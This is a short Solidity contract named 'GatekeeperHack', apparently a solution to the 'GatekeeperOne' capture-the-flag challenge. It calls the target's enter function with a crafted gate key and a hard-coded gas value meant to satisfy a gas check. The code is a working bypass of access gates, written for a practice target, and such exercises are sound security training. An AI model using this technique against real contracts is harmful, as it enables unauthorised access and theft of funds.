// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../gatekeeper/Gatekeeper.sol";

contract GatekeeperHack {
    function enter(address instance, bytes8 _gateKey) public {
        GatekeeperOne gatekeeper = GatekeeperOne(instance);
        gatekeeper.enter{gas: 24827}(_gateKey);
    }
}
